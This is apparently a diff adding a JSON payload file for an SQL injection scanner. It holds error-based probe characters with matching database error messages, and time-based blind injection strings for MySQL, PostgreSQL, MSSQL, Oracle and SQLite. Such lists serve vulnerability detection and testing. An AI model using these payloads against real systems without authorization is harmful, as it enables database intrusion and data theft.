@@ -1,0 +1,36 @@
+{
+  "error-based": {
+    "payloads": [
+      "\"",
+      "'",
+      "1)",
+      "1("
+    ],
+    "messages": [
+      "you have an error in your sql syntax",
+      "warning: mysql",
+      "unclosed quotation mark after the character string",
+      "quoted string not properly terminated"
+    ]
+  },
+  "time-based": [
+    "1 + sleep({sleep}) -- a",
+    "1' + sleep({sleep}) -- a",
+    "1\" + sleep({sleep}) -- a",
+    "1 and sleep({sleep}) -- a",
+    "1' and sleep({sleep}) -- a",
+    "1\" and sleep({sleep}) -- a",
+    "1 || pg_sleep({sleep}) -- a",
+    "1' || pg_sleep({sleep}) -- a",
+    "1\" || pg_sleep({sleep}) -- a",
+    "1 WAITFOR DELAY '0:0:{sleep}' -- a",
+    "1' WAITFOR DELAY '0:0:{sleep}' -- a",
+    "1\" WAITFOR DELAY '0:0:{sleep}' -- a",
+    "1 AND 123=DBMS_PIPE.RECEIVE_MESSAGE('ASD',{sleep}) -- a",
+    "1' AND 123=DBMS_PIPE.RECEIVE_MESSAGE('ASD',{sleep}) -- a",
+    "1\" AND 123=DBMS_PIPE.RECEIVE_MESSAGE('ASD',{sleep}) -- a",
+    "1 AND 123=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB({sleep}00000000/2)))) -- a",
+    "1' AND 123=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB({sleep}00000000/2)))) -- a",
+    "1\" AND 123=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB({sleep}00000000/2)))) -- a"
+  ]
+}
